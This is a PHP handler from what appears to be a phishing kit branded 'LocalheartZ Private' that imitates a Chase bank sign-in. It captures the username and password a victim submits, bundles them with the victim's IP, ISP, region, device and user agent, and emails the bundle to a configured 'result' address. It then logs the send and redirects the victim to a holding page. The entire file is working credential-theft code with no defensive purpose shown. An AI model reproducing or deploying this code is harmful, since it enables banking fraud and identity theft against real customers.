<?php
require_once(dirname(dirname(dirname(__DIR__))) . '/autoload.php');

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (empty($_POST['username']) || empty($_POST['password'])) {
        $link = '/auth/signin?indexToken=' . sha1(md5($core->_get_ses('ip'))) . '&authToken=' . md5(sha1($core->_get_ses('ip')));
        $core->_redirect($link);
    }

    $core->_save_ses('username', trim($_POST['username']));
    $core->_save_ses('password', trim($_POST['password']));

    $browser = $core->is_mobile ? $core->_get_ses('mobile', $core->mobile) : $core->_get_ses('browser', $core->browser);

    $message    = "
    --------------[ LocalheartZ Private ] ------------------ <br>
    <br>
    ----- Chase Account ----- <br>
    Username : " . $core->_get_ses('username') . "<br>
    Password : " . $core->_get_ses('password') . "<br>
    <br>
    ----- Email Account ----- <br>
    IP & ISP : " . $core->_get_ses('ip') . " | " . $core->_get_ses('isp') . "<br>
    Date : " . $core->_re_date() . "<br>
    Device : " . $core->_get_ses('platform') . "<br>
    User Agent : " . $browser . ", " . $core->_get_ses('useragent') . "<br>
    <br>
    --------------[ LocalheartZ Private ] ------------------ <br>
    ";
    $subject    = "Result Chase Login [ " . $core->_get_ses('ip') . " - " . $core->_get_ses('regionName') . " ] ";
    $sendername = "LHZ - CHASE";
    $send       = $core->_send(trim($core->_config('result')), $sendername, $subject, $message, 'account');
    //
    $core->_visitor('submitted login.');
    $core->updateJmlh('login');
    $sender = ($core->_config('sender') == 0 ? 'SMTP' : 'MAIL');
    if ($send == TRUE) {
        $core->_sendlog($sender, trim($core->_config('result')), 'Chase Login', 'Success');
    } else {
        $core->_sendlog($sender, trim($core->_config('result')), 'Chase Login', 'Failed');
    }
    //
    $core->_redirect('/auth/onhold?indexToken=' . sha1(md5($core->_get_ses('ip'))) . '&authToken=' . md5(sha1($core->_get_ses('ip'))));
}else{
  die('not a post method.'); exit;
}


?>
